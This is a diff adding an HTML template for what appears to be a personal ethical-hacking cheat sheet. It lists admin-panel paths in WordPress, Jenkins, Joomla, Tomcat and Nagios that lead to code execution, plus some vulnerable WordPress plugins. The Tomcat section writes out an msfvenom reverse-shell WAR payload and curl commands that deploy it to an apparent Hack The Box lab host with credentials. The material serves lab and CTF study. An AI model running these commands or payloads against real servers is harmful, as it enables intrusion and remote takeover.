@@ -1,0 +1,45 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>WordPress</h1>
+    <div class="code-box"><pre><code>AdRotate -> Manage media</code></pre></div>
+    <div class="code-box"><pre><code>Appearence -> Editor</code></pre></div>
+
+    <h2>Plugins</h2>
+    <table>
+        <tbody>
+            <tr>
+                <td>dvanced-video-embed-embed-videos-or-playlists v1.0</td>
+            </tr>
+            <tr>
+                <td>social warfare 3.5.0 </td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h1>Jenkis</h1>
+    <div class="code-box"><pre><code>Dashborad -> Manage Jenkins -> System -> Global Cred</code></pre></div>
+    <div class="code-box"><pre><code>New-Item -> Freestyle Project -> Build (Execute Windows batch command) -> Build Now</code></pre></div>
+
+    <h1>Joomla</h1>
+    <div class="code-box"><pre><code>Extensions -> Templates -> Templates</code></pre></div>
+
+
+    <h1>tomcat</h1>
+    <div class="code-box"><pre><code>WAR file to deploy</code></pre></div>
+    <div class="code-box"><pre><code>└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.40 lport=4444 -f war -o rev.war
+└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/rev --upload-file rev.war
+└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/rev</code></pre></div>
+
+
+    <h1>Nagios</h1>
+    <div class="code-box"><pre><code>Configure -> CoreConfigure Manager -> Command tab -> Add New -> Host -> localhost</code></pre></div>
+</body>
+</html>
